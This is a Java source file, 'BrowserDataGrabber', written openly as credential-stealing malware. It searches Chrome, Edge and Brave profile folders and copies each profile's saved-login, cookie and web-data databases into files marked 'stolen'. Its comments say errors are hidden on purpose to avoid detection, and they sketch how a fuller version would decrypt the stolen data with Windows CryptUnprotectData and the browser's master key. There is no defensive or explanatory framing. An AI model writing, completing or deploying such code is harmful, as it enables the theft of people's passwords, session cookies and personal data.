import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.util.ArrayList;
import java.util.List;

public class BrowserDataGrabber {

    private static final String[] CHROMIUM_PATHS = {
        "\\Google\\Chrome\\User Data",
        "\\Microsoft\\Edge\\User Data",
        "\\BraveSoftware\\Brave-Browser\\User Data"
    };

    public static void grabChromiumData(String destDir) {
        String appData = System.getenv("LOCALAPPDATA");
        if (appData == null) return;

        for (String path : CHROMIUM_PATHS)
            try {
                File userProfileDir = new File(appData + path);
                if (!userProfileDir.exists()) continue;

                // Find all profile directories (Default, Profile 1, etc.)
                File[] profiles = userProfileDir.listFiles(file -> file.isDirectory() && 
                    (file.getName().startsWith("Profile") || file.getName().equals("Default")));

                if (profiles != null) {
                    for (File profile : profiles) {
                        stealFromProfile(profile, destDir);
                    }
                }
            } catch (Exception e) {
                // Silent fail to avoid detection
            }
    }

    private static void stealFromProfile(File profileDir, String destDir) {
        String[] targets = {"Login Data", "Cookies", "Web Data"};
        for (String target : targets) {
            File sourceFile = new File(profileDir, target);
            if (sourceFile.exists()) {
                try {
                    // Copy the database file
                    File destFile = new File(destDir, profileDir.getName() + "_" + target + "_stolen.db");
                    copyFile(sourceFile, destFile);
                    
                    // NOTE: Decryption happens here in a real scenario using a native library
                    // to call CryptUnprotectData with the master key found in 
                    // Local State file (JSON parsing required).
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private static void copyFile(File source, File dest) throws IOException {
        try (FileInputStream fis = new FileInputStream(source);
             FileOutputStream fos = new FileOutputStream(dest);
             FileChannel inputChannel = fis.getChannel();
             FileChannel outputChannel = fos.getChannel()) {
            outputChannel.transferFrom(inputChannel, 0, inputChannel.size());
        }
    }
}